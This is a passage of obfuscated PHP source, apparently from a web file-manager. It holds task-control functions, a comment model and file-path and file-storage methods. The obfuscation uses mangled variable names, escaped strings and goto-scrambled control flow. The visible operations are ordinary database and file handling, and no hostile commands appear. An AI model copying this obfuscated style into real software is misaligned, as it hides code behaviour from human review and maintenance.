self::valueGet($B‡¡á»¸ ¤); if (is_array($eÆÓ¢ÉŞ™õ) && $eÆÓ¢ÉŞ™õ[$f½İÏÚ°›[1570]]) { $CÍÔµ¢·ËÂ = ActionApply($eÆÓ¢ÉŞ™õ[$f½İÏÚ°›[1570]], array($eÆÓ¢ÉŞ™õ)); $eÆÓ¢ÉŞ™õ = is_array($CÍÔµ¢·ËÂ) ? $CÍÔµ¢·ËÂ : $eÆÓ¢ÉŞ™õ; } return $eÆÓ¢ÉŞ™õ; } public static function listData() { $f«½Œ¾È = self::valueGet(); return array_sort_by($f«½Œ¾È, $_SERVER[ä°„ä°º][772], !0); } public static function kill($fä´½®¸ ) { return self::changeStatus($fä´½®¸ , self::STATYS_KILL); } public static function stop($C©äê†áÏ¹) { return self::changeStatus($C©äê†áÏ¹, self::STATYS_STOP); } public static function restart($d¶«›”†) { return self::changeStatus($d¶«›”†, self::STATYS_RUNNING); } public static function killAll() { $FØ¢ö‹»™ =& $_SERVER[ä°„ä°º]; $fÊ—ğ·ò = self::listData(); foreach ($fÊ—ğ·ò as $F‘ˆ¦ñŸ©é) { self::kill($F‘ˆ¦ñŸ©é[$FØ¢ö‹»™[393]]); } sleep(2); foreach ($fÊ—ğ·ò as $F‘ˆ¦ñŸ©é) { self::valueSet($F‘ˆ¦ñŸ©é[$FØ¢ö‹»™[393]], !1); } } private static function changeStatus($f¤Ê»‹è‰ˆ, $D•Ä˜‰ƒÍœ) { goto Aâê’îãëÙ; Aâê’îãëÙ: $C ŒŸÊàÚ‚ =& $_SERVER[ä°„ä°º]; $B•ÔŞÇ›Ğñ = self::valueGet($f¤Ê»‹è‰ˆ); if (!$B•ÔŞÇ›Ğñ) { return !1; } goto BÛòİà÷; f¢ß÷»å¼: return !0; goto f©ĞÕ¬ëç¯; BÛòİà÷: $B•ÔŞÇ›Ğñ[$C ŒŸÊàÚ‚[733]] = $D•Ä˜‰ƒÍœ; self::valueSet($f¤Ê»‹è‰ˆ, $B•ÔŞÇ›Ğñ); self::log($C ŒŸÊàÚ‚[1571] . $B•ÔŞÇ›Ğñ[$C ŒŸÊàÚ‚[393]] . $C ŒŸÊàÚ‚[1572] . $D•Ä˜‰ƒÍœ); goto f¢ß÷»å¼; f©ĞÕ¬ëç¯: } public static function valueGet($bÎê“³÷‘ë = false) { $d³ÈÇÒ´µÚ =& $_SERVER[ä°„ä°º]; if ($bÎê“³÷‘ë) { $E’Ì‚ğ¡ë› = Model($d³ÈÇÒ´µÚ[425])->where(array($d³ÈÇÒ´µÚ[93] => $bÎê“³÷‘ë, $d³ÈÇÒ´µÚ[29] => $d³ÈÇÒ´µÚ[1573]))->find(); return $E’Ì‚ğ¡ë› ? json_decode($E’Ì‚ğ¡ë›[$d³ÈÇÒ´µÚ[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Cëİã˜èô = false) { goto eÅ—ÂĞö°; eÅ—ÂĞö°: $fÑÌ¿­öÂò =& $_SERVER[ä°„ä°º]; $D¾ì‹âÊ¿ = array($fÑÌ¿­öÂò[29] => $fÑÌ¿­öÂò[1573]); if ($Cëİã˜èô) { $D¾ì‹âÊ¿[$fÑÌ¿­öÂò[1551]] = $Cëİã˜èô; } goto E›¢Åñã²; E›¢Åñã²: $d´¤ó†Œš£ = Model($fÑÌ¿­öÂò[425])->where($D¾ì‹âÊ¿)->select(); $d´¤ó†Œš£ = $d´¤ó†Œš£ ? $d´¤ó†Œš£ : array(); foreach ($d´¤ó†Œš£ as $d§Üõª§‰Ã => $aÛ…Ş¬‚í) { $d´¤ó†Œš£[$d§Üõª§‰Ã] = json_decode($aÛ…Ş¬‚í[$fÑÌ¿­öÂò[372]], !0); } goto bÚ„ò¼³µõ; bÚ„ò¼³µõ: return $d´¤ó†Œš£; goto d…Óëš…¿ï; d…Óëš…¿ï: } public static function valueSet($fİÔÙæéÌ, $eÉ¸ê²Ô¤) { goto bÄç«Œæé­; b¦‚ÏÚ•¼Ù: CacheLock::unlock($EÑôöáçœ’); goto B”œºšˆ¶Á; d¹ÍßÆè: if (!$Eô›ˆŸÒ±) { ob_start(); var_dump($eÉ¸ê²Ô¤); $f¥¼ˆŸÛ³ = ob_get_clean(); self::log($E¼è…÷ß‚á[1574] . json_encode_force($f¥¼ˆŸÛ³)); } if (!$fİÔÙæéÌ || !$eÉ¸ê²Ô¤[$E¼è…÷ß‚á[393]]) { return !1; } $fÃ†õ½¡¯ = array($E¼è…÷ß‚á[29] => $E¼è…÷ß‚á[1573], $E¼è…÷ß‚á[1551] => USER_ID, $E¼è…÷ß‚á[93] => $fİÔÙæéÌ, $E¼è…÷ß‚á[372] => $Eô›ˆŸÒ±); goto B’äÜ¬¿É…; B’äÜ¬¿É…: $EÑôöáçœ’ = $E¼è…÷ß‚á[1575]; CacheLock::lock($EÑôöáçœ’); Model($E¼è…÷ß‚á[425])->add($fÃ†õ½¡¯, array(), !0); goto b¦‚ÏÚ•¼Ù; bÄç«Œæé­: $E¼è…÷ß‚á =& $_SERVER[ä°„ä°º]; if (!$eÉ¸ê²Ô¤) { return Model($E¼è…÷ß‚á[425])->where(array($E¼è…÷ß‚á[93] => $fİÔÙæéÌ, $E¼è…÷ß‚á[29] => $E¼è…÷ß‚á[1573]))->delete(); } $Eô›ˆŸÒ± = json_encode($eÉ¸ê²Ô¤); goto d¹ÍßÆè; B”œºšˆ¶Á: } public static function log($eòÆ‘½‘™Ç) { if (!GLOBAL_DEBUG) { return; } write_log($eòÆ‘½‘™Ç, $_SERVER[ä°„ä°º][1576]); } } goto D…†Ê²ò…; B“ ¨½ç¿: class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\145\x6e\x74"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\141\155\145" => "\x63\157\x6d\x6d\x65\156\x74\x5f\155\145\164\141", "\x6d\x65\x74\x61\x46\x69\x65\x6c\x64" => "\143\x6f\x6d\x6d\145\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($B•·ßšØõ¹) { $bÃ…ÅÄ©ºº =& $_SERVER[ä°„ä°º]; if ($B•·ßšØõ¹[$bÃ…ÅÄ©ºº[1748]]) { $D›ì£ç”Õ¼ = $this->where(array($bÃ…ÅÄ©ºº[1749] => $B•·ßšØõ¹[$bÃ…ÅÄ©ºº[1748]]))->find(); if (!$D›ì£ç”Õ¼ || $D›ì£ç”Õ¼[$bÃ…ÅÄ©ºº[404]] != $B•·ßšØõ¹[$bÃ…ÅÄ©ºº[404]] || $D›ì£ç”Õ¼[$bÃ…ÅÄ©ºº[484]] != $B•·ßšØõ¹[$bÃ…ÅÄ©ºº[484]]) { return !1; } $this->where(array($bÃ…ÅÄ©ºº[1749] => $B•·ßšØõ¹[$bÃ…ÅÄ©ºº[1748]]))->setAdd($bÃ…ÅÄ©ºº[1750], 1); } $B•·ßšØõ¹[$bÃ…ÅÄ©ºº[1751]] = 0; $B•·ßšØõ¹[$bÃ…ÅÄ©ºº[1750]] = 0; $B•·ßšØõ¹[$bÃ…ÅÄ©ºº[733]] = 1; return $this->add($B•·ßšØõ¹); } public function commentCount($E½Ô¢ÑñŠ», $EªÙÕôÛóö) { goto AÕ«·»±ƒ†; e…‚‹ó½ë: return array_to_keyvalue($eÅŠÜÃÉô, $E†Çõ¿Ùèô[484], $E†Çõ¿Ùèô[480]); goto CÓÒîì»Âé; aˆÛâÍ´µñ: $DÓ¡¸µÖ = array($E†Çõ¿Ùèô[484], $E†Çõ¿Ùèô[1752] => $E†Çõ¿Ùèô[480]); $a—«Í¤ƒß = array($E†Çõ¿Ùèô[484] => array($E†Çõ¿Ùèô[7], $E½Ô¢ÑñŠ»), $E†Çõ¿Ùèô[404] => $EªÙÕôÛóö); $eÅŠÜÃÉô = $this->field($DÓ¡¸µÖ)->where($a—«Í¤ƒß)->group($E†Çõ¿Ùèô[484])->select(); goto e…‚‹ó½ë; AÕ«·»±ƒ†: $E†Çõ¿Ùèô =& $_SERVER[ä°„ä°º]; if (!$E½Ô¢ÑñŠ») { return array(); } if (is_string($E½Ô¢ÑñŠ») || is_int($E½Ô¢ÑñŠ»)) { $E½Ô¢ÑñŠ» = array($E½Ô¢ÑñŠ»); } goto aˆÛâÍ´µñ; CÓÒîì»Âé: } public function remove($eÊæ§Ä¢õ•) { $DİŠä¥¶¦ö =& $_SERVER[ä°„ä°º]; $D„¡İÔ†·á = array($DİŠä¥¶¦ö[1749] => $eÊæ§Ä¢õ•); $Eìˆëõ„‚ = $this->where($D„¡İÔ†·á)->find(); if ($Eìˆëõ„‚[$DİŠä¥¶¦ö[1748]]) { $this->where(array($DİŠä¥¶¦ö[1749] => $Eìˆëõ„‚[$DİŠä¥¶¦ö[1748]]))->setAdd($DİŠä¥¶¦ö[1750], -1); } return $this->where($D„¡İÔ†·á)->delete(); } public function edit($d©Æ™®‘îè, $F˜¢ºèÚÍÍ) { $BÆ§œ’àêá =& $_SERVER[ä°„ä°º]; $a°ÉêÚ²Ä‘ = array($BÆ§œ’àêá[1749] => $d©Æ™®‘îè); return $this->where($a°ÉêÚ²Ä‘)->save(array($BÆ§œ’àêá[1753] => $F˜¢ºèÚÍÍ)); } public function prasise($Eª¿ñŠŠÖµ) { $C¼óÂ³–¹Ì =& $_SERVER[ä°„ä°º]; $B‘ï‚®îà– = Model($C¼óÂ³–¹Ì[1754]); $e¶Ò‚Œæˆ³ = array($C¼óÂ³–¹Ì[1749] => $Eª¿ñŠŠÖµ, $C¼óÂ³–¹Ì[1542] => USER_ID); $bÌˆ¾È°Ê = $B‘ï‚®îà–->where($e¶Ò‚Œæˆ³)->find(); if (!$bÌˆ¾È°Ê) { $B‘ï‚®îà–->add($e¶Ò‚Œæˆ³); $A¹ÔšÒéğ = $this->where(array($C¼óÂ³–¹Ì[1749] => $Eª¿ñŠŠÖµ))->setAdd($C¼óÂ³–¹Ì[1751], 1); } else { $B‘ï‚®îà–->where($e¶Ò‚Œæˆ³)->delete(); $A¹ÔšÒéğ = $this->where(array($C¼óÂ³–¹Ì[1749] => $Eª¿ñŠŠÖµ))->setAdd($C¼óÂ³–¹Ì[1751], -1); } return $A¹ÔšÒéğ; } public function targetInfo($Eà¬çù‡, $DÔ…¬ÉÓ¢) { goto aµ ö®Åï; aµ ö®Åï: $dİ†ø´± =& $_SERVER[ä°„ä°º]; $DÃˆ¦Ÿºö‰ = array($dİ†ø´±[562] => $Eà¬çù‡, $dİ†ø´±[563] => $DÔ…¬ÉÓ¢); $a½›‘ËŸ = $this->where($DÃˆ¦Ÿºö‰)->count(); goto d”¨Şá˜Ñ; bšØ•¶‚Ì†: return $EˆØéöÌ¯Æ; goto A±±Í‹ãÍ“; d”¨Şá˜Ñ: $b§Ş½©ŸŒè = "\122\x49\x47\x48\124\x20\x4a\117\x49\x4e\40{$this->tablePrefix}\143\x6f\155\x6d\x65\x6e\164\137\160\x72\141\x69\163\x65\40\163\164\x61\x72\40\x6f\x6e\40\x63\157\155\155\x65\x6e\164\56\143\x6f\155\x6d\x65\156\164\x49\104\40\75\x20\163\x74\x61\162\x2e\x63\157\x6d\155\x65\156\164\x49\104"; $Bõé¾ÆÆ = $this->alias($dİ†ø´±[352])->where($DÃˆ¦Ÿºö‰)->join($b§Ş½©ŸŒè, $dİ†ø´±[1755])->count(); $EˆØéöÌ¯Æ = array($dİ†ø´±[1756] => $a½›‘ËŸ, $dİ†ø´±[1757] => $Bõé¾ÆÆ); goto bšØ•¶‚Ì†; A±±Í‹ãÍ“: } public function listData($e×õ¼«ß¿Í) { $fÊÍ˜—Ë«¸ =& $_SERVER[ä°„ä°º]; if (isset($e×õ¼«ß¿Í[$fÊÍ˜—Ë«¸[1758]])) { if ($e×õ¼«ß¿Í[$fÊÍ˜—Ë«¸[1758]]) { $e×õ¼«ß¿Í[$fÊÍ˜—Ë«¸[1759]] = array($fÊÍ˜—Ë«¸[993], intval($e×õ¼«ß¿Í[$fÊÍ˜—Ë«¸[1758]])); } unset($e×õ¼«ß¿Í[$fÊÍ˜—Ë«¸[1758]]); } if (isset($e×õ¼«ß¿Í[$fÊÍ˜—Ë«¸[1760]])) { if ($e×õ¼«ß¿Í[$fÊÍ˜—Ë«¸[1760]]) { $e×õ¼«ß¿Í[$fÊÍ˜—Ë«¸[1759]] = array($fÊÍ˜—Ë«¸[990], intval($e×õ¼«ß¿Í[$fÊÍ˜—Ë«¸[1760]])); } unset($e×õ¼«ß¿Í[$fÊÍ˜—Ë«¸[1760]]); } return $this->_listData($e×õ¼«ß¿Í); } private function _listData($B´ÌïµŠ‡ˆ) { $d…†ÀÊí˜í =& $_SERVER[ä°„ä°º]; $Cê®è‰æµ‘ = $this->where($B´ÌïµŠ‡ˆ)->_makeOrder()->selectPage(100); $this->_listAppendParent($Cê®è‰æµ‘[$d…†ÀÊí˜í[367]]); $this->_listAppendUser($Cê®è‰æµ‘[$d…†ÀÊí˜í[367]]); $this->_listAppendMeta($Cê®è‰æµ‘[$d…†ÀÊí˜í[367]]); return $Cê®è‰æµ‘; } private function _makeOrder() { $d¡÷à‰ˆäí =& $_SERVER[ä°„ä°º]; $eÄ‚®õñéÕ = array($d¡÷à‰ˆäí[1751], $d¡÷à‰ˆäí[1750], $d¡÷à‰ˆäí[194]); $c…øŞõß = Input::get($d¡÷à‰ˆäí[435], $d¡÷à‰ˆäí[7], $d¡÷à‰ˆäí[416], $eÄ‚®õñéÕ); $B¯îğä½ğç = Input::get($d¡÷à‰ˆäí[436], $d¡÷à‰ˆäí[7], $d¡÷à‰ˆäí[1544], array($d¡÷à‰ˆäí[1761], $d¡÷à‰ˆäí[431])); $f—´ŠÚ‚­² = $c…øŞõß . $d¡÷à‰ˆäí[50] . $B¯îğä½ğç; return $this->order($f—´ŠÚ‚­²); } private function _listAppendParent(&$A‚°Ş¼Î‰“) { goto d¥£•‘œ‰¿; c‰‡‡ËÀÑœ: foreach ($A‚°Ş¼Î‰“ as &$bô¾½¥ñ£‰) { if (isset($e²ºÏ·åîÁ[$bô¾½¥ñ£‰[$BÏÇ­»¶‡¦[1748]]])) { $bô¾½¥ñ£‰[$BÏÇ­»¶‡¦[1762]] = $e²ºÏ·åîÁ[$bô¾½¥ñ£‰[$BÏÇ­»¶‡¦[1748]]]; } } unset($bô¾½¥ñ£‰); goto c½í¶ÑÒä; D„­È›®Ì: if (!$C‘‰ŞÑÁâ‹) { return; } $e²ºÏ·åîÁ = $this->where(array($BÏÇ­»¶‡¦[1749] => array($BÏÇ­»¶‡¦[7], $C‘‰ŞÑÁâ‹)))->select(); $e²ºÏ·åîÁ = array_to_keyvalue($e²ºÏ·åîÁ, $BÏÇ­»¶‡¦[1759]); goto c‰‡‡ËÀÑœ; d¥£•‘œ‰¿: $BÏÇ­»¶‡¦ =& $_SERVER[ä°„ä°º]; $C‘‰ŞÑÁâ‹ = array_unique(array_to_keyvalue($A‚°Ş¼Î‰“, $BÏÇ­»¶‡¦[33], $BÏÇ­»¶‡¦[1748])); $C‘‰ŞÑÁâ‹ = array_remove_value($C‘‰ŞÑÁâ‹, $BÏÇ­»¶‡¦[191]); goto D„­È›®Ì; c½í¶ÑÒä: } private function _listAppendUser(&$f¦ºÅ³±˜Á) { goto Dë¾¢Ÿªª; Dë¾¢Ÿªª: $e‰ÚµÕ£†… =& $_SERVER[ä°„ä°º]; $e¼´’ùó©µ = array_unique(array_to_keyvalue($f¦ºÅ³±˜Á, $e‰ÚµÕ£†…[33], $e‰ÚµÕ£†…[1551])); $e¼´’ùó©µ = array_remove_value($e¼´’ùó©µ, $e‰ÚµÕ£†…[191]); goto C´™‚ˆ³è; C´™‚ˆ³è: if (count($e¼´’ùó©µ) == 0) { return; } foreach ($f¦ºÅ³±˜Á as $DµîË–²ä) { if (isset($DµîË–²ä[$e‰ÚµÕ£†…[1762]])) { $e¼´’ùó©µ[] = $DµîË–²ä[$e‰ÚµÕ£†…[1762]][$e‰ÚµÕ£†…[1551]]; } } $EÔŸÕŒˆìİ = Model($e‰ÚµÕ£†…[519])->userListInfo($e¼´’ùó©µ); goto DÑ¦Ùœ; DÑ¦Ùœ: foreach ($f¦ºÅ³±˜Á as &$DµîË–²ä) { $DµîË–²ä[$e‰ÚµÕ£†…[575]] = $EÔŸÕŒˆìİ[$DµîË–²ä[$e‰ÚµÕ£†…[1551]]]; if (isset($DµîË–²ä[$e‰ÚµÕ£†…[1762]])) { $DµîË–²ä[$e‰ÚµÕ£†…[1762]][$e‰ÚµÕ£†…[575]] = $EÔŸÕŒˆìİ[$DµîË–²ä[$e‰ÚµÕ£†…[1762]][$e‰ÚµÕ£†…[1551]]]; } } unset($DµîË–²ä); goto eËÕ“ŠğšÏ; eËÕ“ŠğšÏ: } private function _listAppendMeta(&$fÇœ¼Œ—Ø) { goto A‡óÑä—³; EŸïµ÷²…: if (!$AêÜ‡¶õ®œ) { return !1; } foreach ($fÇœ¼Œ—Ø as &$bŠñØÃ×‡Á) { $bŠñØÃ×‡Á[$aŒ½¼ÖÉØÒ[445]] = $AêÜ‡¶õ®œ[$bŠñØÃ×‡Á[$aŒ½¼ÖÉØÒ[1759]]]; if (isset($bŠñØÃ×‡Á[$aŒ½¼ÖÉØÒ[1762]])) { $bŠñØÃ×‡Á[$aŒ½¼ÖÉØÒ[1762]][$aŒ½¼ÖÉØÒ[445]] = $AêÜ‡¶õ®œ[$bŠñØÃ×‡Á[$aŒ½¼ÖÉØÒ[1762]][$aŒ½¼ÖÉØÒ[1759]]]; } } unset($bŠñØÃ×‡Á); goto dš¬Í¿‹…Ú; C”šÏ¾ö¶œ: if (!$dÕ”—ÈåÅ¦) { return; } foreach ($fÇœ¼Œ—Ø as $bŠñØÃ×‡Á) { if (isset($bŠñØÃ×‡Á[$aŒ½¼ÖÉØÒ[1762]])) { $dÕ”—ÈåÅ¦[] = $bŠñØÃ×‡Á[$aŒ½¼ÖÉØÒ[1762]][$aŒ½¼ÖÉØÒ[1759]]; } } $AêÜ‡¶õ®œ = $this->metaList($dÕ”—ÈåÅ¦); goto EŸïµ÷²…; A‡óÑä—³: $aŒ½¼ÖÉØÒ =& $_SERVER[ä°„ä°º]; $dÕ”—ÈåÅ¦ = array_unique(array_to_keyvalue($fÇœ¼Œ—Ø, $aŒ½¼ÖÉØÒ[33], $aŒ½¼ÖÉØÒ[1759])); $dÕ”—ÈåÅ¦ = array_remove_value($dÕ”—ÈåÅ¦, $aŒ½¼ÖÉØÒ[191]); goto C”šÏ¾ö¶œ; dš¬Í¿‹…Ú: } private function metaList($aÌãÆ’âÄ) { goto b¡µ£ì´À†; DÎ·ÔÒ¢‹î: return $cèš–±ØÔ ? $cèš–±ØÔ : array(); goto EåªÙöîİŸ; b¡µ£ì´À†: $F¥¸Áù±Ì¼ =& $_SERVER[ä°„ä°º]; if (!$aÌãÆ’âÄ) { return array(); } $e“âŒ´äÈÙ = array($F¥¸Áù±Ì¼[1759] => array($F¥¸Áù±Ì¼[7], $aÌãÆ’âÄ)); goto a’ª„¦ÍÔÚ; a’ª„¦ÍÔÚ: $cèš–±ØÔ = Model($F¥¸Áù±Ì¼[1763])->where($e“âŒ´äÈÙ)->select(); $cèš–±ØÔ = array_to_keyvalue_group($cèš–±ØÔ, $F¥¸Áù±Ì¼[1759]); foreach ($cèš–±ØÔ as $bÊğÆ° => $A‚©êÒîùŸ) { $C†»—‹÷é = array(); foreach ($A‚©êÒîùŸ as $EµšÓğ²×ó) { $C†»—‹÷é[$EµšÓğ²×ó[$F¥¸Áù±Ì¼[93]]] = $EµšÓğ²×ó[$F¥¸Áù±Ì¼[372]]; } $cèš–±ØÔ[$bÊğÆ°] = $C†»—‹÷é; } goto DÎ·ÔÒ¢‹î; EåªÙöîİŸ: } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\151\154\145\137\x63\157\x6e\164\x65\x6e\164\x73"; protected $dataAuto = array(array("\x63\x72\145\141\x74\x65\124\x69\x6d\145", "\164\151\155\145", "\x69\x6e\163\x65\162\x74", "\x66\165\x6e\x63\x74\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\x6c\x65"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\155\145" => "\151\157\x5f\146\x69\x6c\145\x5f\155\145\x74\141", "\155\145\x74\x61\x46\151\145\154\144" => "\146\151\x6c\145\111\x44"); public function fileInfo($fïˆÁ·Íí) { $Fº““äî™Ö =& $_SERVER[ä°„ä°º]; static $FêØ»§ğä· = array(); if (!isset($FêØ»§ğä·[$fïˆÁ·Íí])) { $f˜İ­»ÍÎ = $Fº““äî™Ö[1764]; $EæĞŠ–ƒ¶ = Model($Fº““äî™Ö[450])->field($f˜İ­»ÍÎ)->where(array($Fº““äî™Ö[448] => $fïˆÁ·Íí))->find(); $FêØ»§ğä·[$fïˆÁ·Íí] = $EæĞŠ–ƒ¶; } return $FêØ»§ğä·[$fïˆÁ·Íí]; } public function addFileByContent($cÃ—î›Ûİ = '', $a¡‘Éö´á¯ = '') { goto E†¶Îé‹Š›; d‚í»Ô—İ„: $dëæÄÌÑÆ = $C¼À›«Ó‡ò . $AÃ¶ˆ«ğ§[1766] . rand_string(16); file_put_contents($dëæÄÌÑÆ, $cÃ—î›Ûİ); $eäññà·¼“ = $this->addFile($dëæÄÌÑÆ, $a¡‘Éö´á¯, !0); goto D“ëßì´‡Ô; E†¶Îé‹Š›: $AÃ¶ˆ«ğ§ =& $_SERVER[ä°„ä°º]; $C¼À›«Ó‡ò = TEMP_PATH . $AÃ¶ˆ«ğ§[1765]; if (!is_dir($C¼À›«Ó‡ò)) { mk_dir($C¼À›«Ó‡ò); } goto d‚í»Ô—İ„; D“ëßì´‡Ô: if (file_exists($dëæÄÌÑÆ)) { @unlink($dëæÄÌÑÆ); } return $eäññà·¼“; goto DÒª›¦Œ¥; DÒª›¦Œ¥: } public function createFileName($Cæô•ÖøŠ‰, $eÎâÇÁğê– = false, $añµØì×Ì® = false) { goto b•â‡¥á”±; D¸™í«ÈîŒ: $E¬œõ’¯Ò = $Cš”¬Ê‚¸‡->pathFather($DïÄó³ôïÀ); static $då¿ÊøÏ¬ = false; $B¾èÖØ‹Ú¹ = $c”ÑØÑäïš[1767] . md5($E¬œõ’¯Ò); goto EîÕ˜¿¶Äá; b•â‡¥á”±: $c”ÑØÑäïš =& $_SERVER[ä°„ä°º]; $Cš”¬Ê‚¸‡ = IO::init($c”ÑØÑäïš[8]); $DïÄó³ôïÀ = $this->makeFilePath($Cæô•ÖøŠ‰, $Cš”¬Ê‚¸‡, $eÎâÇÁğê–, $añµØì×Ì®); goto D¸™í«ÈîŒ; EîÕ˜¿¶Äá: if (!$då¿ÊøÏ¬ && !Cache::get($B¾èÖØ‹Ú¹)) { $då¿ÊøÏ¬ = !0; $CÁí×†Ïï‚ = IO::mkdir($E¬œõ’¯Ò); if (!IO::exist($CÁí×†Ïï‚ . $c”ÑØÑäïš[784])) { IO::mkfile($CÁí×†Ïï‚ . $c”ÑØÑäïš[784]); } Cache::set($B¾èÖØ‹Ú¹, 1, 3600 * 2); } return $DïÄó³ôïÀ; goto céê‹“Æë‘; céê‹“Æë‘: } public function makeFilePath($Aõ‰’±îŸˆ, $Dø³ª÷Ç›ö, $F—ç–ˆí®Ï = false, $eÀ„´èˆŞÃ = false) { goto f…¡¶öÆ¢Í; f…¡¶öÆ¢Í: $bÓ©Õ¡…ì’ =& $_SERVER[ä°„ä°º]; $b‡ó˜ÅôğÇ = Model($bÓ©Õ¡…ì’[753])->get($bÓ©Õ¡…ì’[1768]); $BößÜ¸æ“¼ = KodIO::defaultIO() . date($bÓ©Õ¡…ì’[1769]); goto bó™ˆ…Ãç; bó™ˆ…Ãç: $CÆ–³”ÛÇó = $BößÜ¸æ“¼ . rand_string(5) . short_id(100); $Aõ‰’±îŸˆ = str_replace($bÓ©Õ¡…ì’[8], $bÓ©Õ¡…ì’[71], KodIO::clear($Aõ‰’±îŸˆ)); $c®ˆ”¥å’ = $Dø³ª÷Ç›ö->ext($Aõ‰’±îŸˆ); goto f¹‘óøãå; f¹‘óøãå: if (!$Aõ‰’±îŸˆ) { $b‡ó˜ÅôğÇ = $bÓ©Õ¡…ì’[1770]; } switch ($b‡ó˜ÅôğÇ) { case $bÓ©Õ¡…ì’[1771]: $CÆ–³”ÛÇó = $CÆ–³”ÛÇó . $bÓ©Õ¡…ì’[95] . $Dø³ª÷Ç›ö->ext($Aõ‰’±îŸˆ); if ($c®ˆ”¥å’ == $bÓ©Õ¡…ì’[1710]) { $CÆ–³”ÛÇó .= $bÓ©Õ¡…ì’[1450]; } break; case $bÓ©Õ¡…ì’[1772]: goto F¥·ÚÙ…ÇÂ; C±Í¾éæìİ: $BößÜ¸æ“¼ = $bÓ©Õ¡…ì’[1145] . $d«ŞÆÍÑÂ[$bÓ©Õ¡…ì’[393]] . $bÓ©Õ¡…ì’[402] . date($bÓ©Õ¡…ì’[1773]) . $d‹ëå²µø . $bÓ©Õ¡…ì’[8]; if ($c®ˆ”¥å’ == $bÓ©Õ¡…ì’[1710]) { $Aõ‰’±îŸˆ .= $bÓ©Õ¡…ì’[1450]; } $CÕåŸŸ¬ = $bÓ©Õ¡…ì’[1774] . $BößÜ¸æ“¼ . $Aõ‰’±îŸˆ; goto AÛÍ³”ô°Ñ; AÛÍ³”ô°Ñ: CacheLock::lock($CÕåŸŸ¬); $CÆ–³”ÛÇó = $BößÜ¸æ“¼ . $Aõ‰’±îŸˆ; if (IO::exist($BößÜ¸æ“¼ . $Aõ‰’±îŸˆ)) { $Cé†¸…Èßä = substr($Aõ‰’±îŸˆ, 0, strlen($Aõ‰’±îŸˆ) - strlen($c®ˆ”¥å’)); $dïùõ‰¾›¼ = $eÀ„´èˆŞÃ ? substr($eÀ„´èˆŞÃ, 0, 5) : ($F—ç–ˆí®Ï ? substr($F—ç–ˆí®Ï, 0, 5) : rand_string(5)); $CÆ–³”ÛÇó = $BößÜ¸æ“¼ . $Cé†¸…Èßä . $dïùõ‰¾›¼ . $bÓ©Õ¡…ì’[95] . $c®ˆ”¥å’; } goto Dõ‡áÏÚ; F¥·ÚÙ…ÇÂ: $d¦¸©¸¤ = Model($bÓ©Õ¡…ì’[753])->get($bÓ©Õ¡…ì’[754]); $d‹ëå²µø = substr(md5($bÓ©Õ¡…ì’[755] . $d¦¸©¸¤ . date($bÓ©Õ¡…ì’[731])), 0, 8); $d«ŞÆÍÑÂ = KodIO::defaultDriver(); goto C±Í¾éæìİ; Dõ‡áÏÚ: if (IO::isTypeObject($CÆ–³”ÛÇó) && !IO::isUploadServer($CÆ–³”ÛÇó)) { if (IO::exist($CÆ–³”ÛÇó)) { return $CÆ–³”ÛÇó; } $b±ƒŞ‰¦‰± = IO::setContent($CÆ–³”ÛÇó, $bÓ©Õ¡…ì’[33]); if (!$b±ƒŞ‰¦‰±) { show_json($bÓ©Õ¡…ì’[1775], !1); } } CacheLock::unlock($CÕåŸŸ¬); break; goto c¯£É¥†Î; c¯£É¥†Î: case $bÓ©Õ¡…ì’[1770]: break; default: break; } return $CÆ–³”ÛÇó; goto FÄğ¹ˆ‚¥; FÄğ¹ˆ‚¥: } public function addFileByRemote($c—‡¶Ñ‘ä°, $e’é„›Ş«ì, $e™Õ«õ‹èƒ = array()) { goto a›®ˆ²ÇÈ; d†»÷ğØ²: $eÙï®ÖæÄù = IO::hashMd5($c—‡¶Ñ‘ä°, $F·Šàí…òÌ); $C»¹¾©â†Ì = KodIO::defaultDriver(); $f¹¯™± = array($C´ãù—­ïŠ[561] => IO::size($c—‡¶Ñ‘ä°), $C´ãù—­ïŠ[1776] => 1, $C´ãù—­ïŠ[413] => $e’é„›Ş«ì, $C´ãù—­ïŠ[796] => $C»¹¾©â†Ì[$C´ãù—­ïŠ[393]], $C´ãù—­ïŠ[414] => $c—‡¶Ñ‘ä°, $C´ãù—­ïŠ[1777] => $e™Õ«õ‹èƒ[$C´ãù—­ïŠ[171]] ? $e™Õ«õ‹èƒ[$C´ãù—­ïŠ[171]] : IO::hashSimple($c—‡¶Ñ‘ä°), $C´ãù—­ïŠ[1778] => $eÙï®ÖæÄù ? $eÙï®ÖæÄù : $F·Šàí…òÌ); goto eëéåö½—; a›®ˆ²ÇÈ: $C´ãù—­ïŠ =& $_SERVER[ä°„ä°º]; if (!IO::exist($c—‡¶Ñ‘ä°)) { return !1; } $F·Šàí…òÌ = $e™Õ«õ‹èƒ[$C´ãù—­ïŠ[170]] ? $e™Õ«õ‹èƒ[$C´ãù—­ïŠ[170]] : $C´ãù—­ïŠ[33]; goto d†»÷ğØ²; eëéåö½—: if ($B­Ùƒ¼ë«† = $this->addFileCheckExist($f¹¯™±[$C´ãù—­ïŠ[171]], $f¹¯™±[$C´ãù—­ïŠ[170]], $f¹¯™±[$C´ãù—­ïŠ[78]])) { return $B­Ùƒ¼ë«†; } return $this->addFileData($f¹¯™±); goto CÈµéôĞ‚î; CÈµéôĞ‚î: } private function addFileData($a“è“¥¶—¶) { $Eæƒé…Èì½ =& $_SERVER[ä°„ä°º]; if (!$a“è“¥¶—¶) { return !1; } $a“è“¥¶—¶[$Eæƒé…Èì½[78]] = intval($a“è“¥¶—¶[$Eæƒé…Èì½[78]]); if (!$a“è“¥¶—¶[$Eæƒé…Èì½[78]] && strlen($a“è“¥¶—¶[$Eæƒé…Èì½[171]]) > 32) { $a“è“¥¶—¶[$Eæƒé…Èì½[78]] = intval(substr($a“è“¥¶—¶[$Eæƒé…Èì½[171]], 32)); } 